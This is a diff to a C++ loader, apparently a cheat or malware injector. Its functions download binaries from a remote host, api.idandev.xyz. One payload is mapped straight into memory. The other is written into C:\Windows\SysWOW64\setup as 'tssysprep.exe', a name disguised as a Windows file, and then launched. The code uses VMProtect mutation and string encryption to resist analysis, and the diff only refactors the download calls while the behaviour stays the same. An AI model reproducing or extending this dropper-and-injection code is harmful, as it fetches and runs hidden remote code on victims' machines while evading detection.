@@ -1,5 +1,6 @@
 #include "stdafx.hpp"
 #include "core\injection\injection.hpp"
+#include "requests/requests.hpp"
 #include "utils\utils.hpp"
 #include "ntdll/ntdll.hpp"
 
@@ -7,8 +8,7 @@ bool core::initialize_skript( )
 {
 	vmp_mutation;
 
-	const auto res = cpr::Get( cpr::Url { E( "http://api.idandev.xyz/files/skript" ) } );
-	const std::vector<std::uint8_t> binary( res.text.begin( ), res.text.end( ) );
+	const auto binary = g_requests->download( "http://api.idandev.xyz/files/skript" );
 
 	LPVOID const image_base = map_vector_to_memory( binary );
 
@@ -72,16 +72,11 @@ bool core::initialize_gosth( )
 {
 	vmp_mutation;
 
-	std::vector<std::string> url_out { E( "http://api.idandev.xyz/files/gosth" ), E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) };
+	auto const res = g_requests->download( "http://api.idandev.xyz/files/gosth" );
 
-	const std::string &url = url_out[ 0 ];
-	const std::string &output_file_path = url_out[ 1 ];
+	std::ofstream outputFile( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ), std::ios::binary );
 
-	auto const res = cpr::Get( cpr::Url { url } );
-
-	std::ofstream outputFile( output_file_path, std::ios::binary );
-
-	outputFile.write( res.text.c_str( ), res.text.length( ) );
+	outputFile.write( reinterpret_cast< const char* > ( res.data( ) ), res.size( ) );
 	outputFile.close( );
 
 	utils::system::create_process( E( R"(C:\Windows\SysWOW64\setup\tssysprep.exe)" ) );
